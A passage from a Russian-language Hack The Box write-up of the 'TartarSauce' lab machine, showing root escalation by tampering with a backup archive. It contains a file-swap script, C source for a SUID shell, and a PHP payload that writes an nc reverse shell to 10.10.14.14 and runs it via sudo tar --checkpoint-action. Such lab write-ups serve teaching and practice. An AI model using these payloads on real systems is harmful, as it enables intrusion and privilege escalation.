while [[ "${start}" == "${curr}" ]] || [[ "${curr}" == "" ]]; do
	sleep 10;
	curr=$(find /var/tmp -maxdepth 1 -type f -regextype sed -regex '.*/.[a-f0-9]\{40\}');
done

# Копируем архив в /dev/shm
echo '[*] File changed. Сopying to /dev/shm...'
cp ${curr} ${wd}
sleep 1

# Получаем basename из пути
fn=/$(basename ${curr})

# Распаковываем
tar -zxf ${wd}${fn} -C ${wd}

# Заменяем robots.txt на мягкую ссылку до root.txt
rm ${wd}${robotstxt}
ln -sv ${roottxt} ${wd}${robotstxt}

# Удаляем старый архив
rm ${wd}${fn}

# Создаем новый архив
chmod -R a+x ${wd}/var
tar -czf ${wd}${fn} var

# Кладем новый архив на место старого
mv ${wd}${fn} ${curr}

# Очищаем лишнее
rm -rf ${wd}/var

# Ждем обновления лога с ошибками
echo '[*] Waiting for error log to update...'
tail -f ${errlog}
```

#### root.txt
Грузим написанный скрипт на жертву, запускаем, немного ждем и, о, счастье, имеем флаг суперпользователя:
```text
onuma@TartarSauce:/dev/shm$ ./.tartarsauce_file_read.sh
[*] Waiting for archive filename to change...
[*] File changed. Сopying to /dev/shm...
'/dev/shm/var/www/html/robots.txt' -> '/root/root.txt'
[*] Waiting for error log to update...
Only in /var/www/html/webservices/wp/wp-includes/js: wp-list-revisions.min.js
Only in /var/www/html/webservices/wp/wp-includes/js: wp-lists.js
Only in /var/www/html/webservices/wp/wp-includes/js: wp-lists.min.js
Only in /var/www/html/webservices/wp/wp-includes/js: wp-sanitize.js
Only in /var/www/html/webservices/wp/wp-includes/js: wp-util.min.js
Only in /var/www/html/webservices/wp/wp-includes/js: zxcvbn-async.min.js
Only in /var/www/html/webservices/wp/wp-includes/js: zxcvbn.min.js
Only in /var/www/html/webservices/wp: wp-load.php
Only in /var/www/html/webservices/wp: wp-login.php
Only in /var/www/html/webservices/wp: wp-settings.php
------------------------------------------------------------------------
Integrity Check Error in backup last ran :  Thu Nov  1 15:14:03 EDT 2018
------------------------------------------------------------------------
/var/tmp/.bc325e2428054e189ea6220a02680df698c47bf9
diff -r /var/www/html/robots.txt /var/tmp/check/var/www/html/robots.txt
1,7c1
< User-agent: *
< Disallow: /webservices/tar/tar/source/
< Disallow: /webservices/monstra-3.0.4/
< Disallow: /webservices/easy-file-uploader/
< Disallow: /webservices/developmental/
< Disallow: /webservices/phpmyadmin/
<
---
> e79abdab8b??????????????????????
^C
```

Очевидно, этот способ позволяет лишь читать содержимое файлов, полноценный же шелл мы получим в следующем параграфе.

### Эксплуатация backuperer: SUID Shell
При создании архива tar запоминает идентификаторы владельцев/группы файлов. Из этой особенности вытекает следующая схема эксплуатации backuperer'а:
  1. Создаем .tar.gz архив с скомпилированным на своей Kali-машине от имени root'а SUID-шеллом.
  2. Перебрасываем этот архив на место настоящего бэкапа на машине-жертве.
  3. Ждем момента (полминуты), когда backuperer распакует фейковый архив в процессе проверке целостности. Проверка целостности, в свою очередь, должна вернуть "Истину" (смотрим на [табличку]({{ page.url }}#табличка)), чтобы скрипт не удалил временную папку `/var/tmp/check/var/www/html`, а у нас, таким образом, было около 4,5 минут для активации шелла.
  4. Запускаем шелл и получаем root-сессию.

Теперь по порядку:

1\. Нам понадобится тривиальный SUID-шелл на Си:
```c
// Usage: gcc -m32 -o suid suid.c && ./suid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
	setreuid(0, 0);
	execve("/bin/bash", NULL, NULL);
	return 0;
}
```

Из вывода `uname -a` мы уже видели, что TartarSauce имеет 32-х битную архитектуру, поэтому компилируем следующим образом:
```text
root@kali:~# gcc -m32 -o suid suid.c
```

Дальше зеркалируем структуру папок оригинального бэкапа (т. к. только в этом случае мы получим `1` от функции `integrity_chk`; опять же — смотрим на [табличку]({{ page.url }}#табличка)) и выставляем setuid-бит на шелл:
```text
root@kali:~# mkdir -p  var/www/html
root@kali:~# cp suid var/www/html
root@kali:~# chmod 6555 var/www/html/suid
root@kali:~# ls -la var/www/html/suid
-r-sr-sr-x 1 root root 15480 Nov  1 16:35 var/www/html/suid
```

И создаем архив, явно указав владельца и группу (необязательно, но к слову, что так можно делать):
```text
root@kali:~# tar -zcvf suid.tar.gz var --owner=root --group=root
```

2\. Загружаем на жертву:
```text
onuma@TartarSauce:/tmp$ wget http://10.10.14.14:31337/suid.tar.gz
--2018-11-01 16:42:41--  http://10.10.14.14:31337/suid.tar.gz
Connecting to 10.10.14.14:31337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2708 (2.6K) [application/gzip]
Saving to: 'suid.tar.gz'

suid.tar.gz   100%[===============================>]   2.64K  --.-KB/s    in 0s

2018-11-01 16:42:41 (256 MB/s) - 'suid.tar.gz' saved [2708/2708]
```

3\. Дожидаемся окна, в течении которого появляется и существует временный архив (или можно в "реалтайме" с помощью `watch -n 1 'systemctl list-timers'`):
```text
onuma@TartarSauce:/tmp$ systemctl list-timers
NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
Thu 2018-11-01 16:53:37 EDT  2s ago   Thu 2018-11-01 16:53:37 EDT  1s ago       backuperer.timer             backuperer.service
Fri 2018-11-02 00:46:00 EDT  7h left  Thu 2018-11-01 14:28:19 EDT  2h 25min ago apt-daily.timer              apt-daily.service
Fri 2018-11-02 06:34:42 EDT  13h left Thu 2018-11-01 14:28:19 EDT  2h 25min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Fri 2018-11-02 14:43:29 EDT  21h left Thu 2018-11-01 14:43:29 EDT  2h 10min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

4 timers listed.
Pass --all to see loaded but inactive timers, too.
```

```text
onuma@TartarSauce:/tmp$ ls -la /var/tmp
total 11276
drwxrwxrwt  8 root  root      4096 Nov  1 16:53 .
drwxr-xr-x 14 root  root      4096 Feb  9  2018 ..
-rw-r--r--  1 onuma onuma 11511663 Nov  1 16:53 .7bd9d1b85480847307593e29d70d7b3286d3b586
drwx------  3 root  root      4096 Nov  1 14:28 systemd-private-04b0d1852f684988a72ce63bf6aa6163-systemd-timesyncd.service-rF9I4i
drwx------  3 root  root      4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
drwx------  3 root  root      4096 Feb 17  2018 systemd-private-7bbf46014a364159a9c6b4b5d58af33b-systemd-timesyncd.service-UnGYDQ
drwx------  3 root  root      4096 Feb 15  2018 systemd-private-9214912da64b4f9cb0a1a78abd4b4412-systemd-timesyncd.service-bUTA2R
drwx------  3 root  root      4096 Feb 15  2018 systemd-private-a3f6b992cd2d42b6aba8bc011dd4aa03-systemd-timesyncd.service-3oO5Td
drwx------  3 root  root      4096 Feb 15  2018 systemd-private-c11c7cccc82046a08ad1732e15efe497-systemd-timesyncd.service-QYRKER
```

И подменяем бэкап:
```text
onuma@TartarSauce:/tmp$ cp suid.tar.gz /var/tmp/.7bd9d1b85480847307593e29d70d7b3286d3b586
```

4\. После ожидания в 30 секунд проверяем существование временной директории `/var/tmp/check`, запускаем шелл и забираем свое:
```text
onuma@TartarSauce:/tmp$ cd /var/tmp/
onuma@TartarSauce:/var/tmp$ ls
check                                                                              systemd-private-9214912da64b4f9cb0a1a78abd4b4412-systemd-timesyncd.service-bUTA2R
systemd-private-04b0d1852f684988a72ce63bf6aa6163-systemd-timesyncd.service-rF9I4i  systemd-private-a3f6b992cd2d42b6aba8bc011dd4aa03-systemd-timesyncd.service-3oO5Td
systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS  systemd-private-c11c7cccc82046a08ad1732e15efe497-systemd-timesyncd.service-QYRKER
systemd-private-7bbf46014a364159a9c6b4b5d58af33b-systemd-timesyncd.service-UnGYDQ

onuma@TartarSauce:/var/tmp$ cd check/
onuma@TartarSauce:/var/tmp/check$ ls
var

onuma@TartarSauce:/var/tmp/check$ cd var/www/html/
onuma@TartarSauce:/var/tmp/check/var/www/html$ ls
suid

onuma@TartarSauce:/var/tmp/check/var/www/html$ ./suid
bash-4.3# whoami
root

bash-4.3# id
uid=0(root) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
```

```text
bash-4.3# cat /root/root.txt
e79abdab8b??????????????????????
```

Триумф :triumph:

# Разное
## wp-load.php
Чтобы дважды не настраивать шелл, сэкономим себе время, написав такой php-скрипт, позволяющий сразу "прыгать" на пользователя *onuma* при триггере RFI-уязвимости WP-плагина:
```php
<!-- wp-load.php -->

<?php
  system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 443 >/tmp/f' > /dev/shm/.sh3ll.sh");
  system("cd / && sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='bash /dev/shm/.sh3ll.sh'");
?>
```

## Доступ к Monstra CMS
А вот почему мы ничего не могли сделать из админки Monstra CMS:
```text
onuma@TartarSauce:~$ ls -la /var/www/html
total 28
drwxr-xr-x 3 www-data www-data  4096 Feb 21  2018 .
drwxr-xr-x 3 root     root      4096 Feb  9  2018 ..
-rw-r--r-- 1 root     root     10766 Feb 21  2018 index.html
-rw-r--r-- 1 root     root       208 Feb 21  2018 robots.txt
drwxr-xr-x 4 root     root      4096 Feb 21  2018 webservices
```

Право на запись в `/var/www/html/webservices` имеет только владелец — root.

К примеру, Monstra загружает файлы в `/var/www/html/webservices/monstra-3.0.4/public`, однако www-data (от имени которого крутится Apache) не может писать в эту директорию:
```text
onuma@TartarSauce:~$ ls -ld /var/www/html/webservices/monstra-3.0.4/public
drwxr-xr-x 5 root root 4096 Apr  5  2016 /var/www/html/webservices/monstra-3.0.4/public
```

Приятного аппетита с соусом Тартар, спасибо за внимание :innocent:

![tartarsauce-owned.png]({{ "/img/htb/boxes/tartarsauce/tartarsauce-owned.png" | relative_url }})
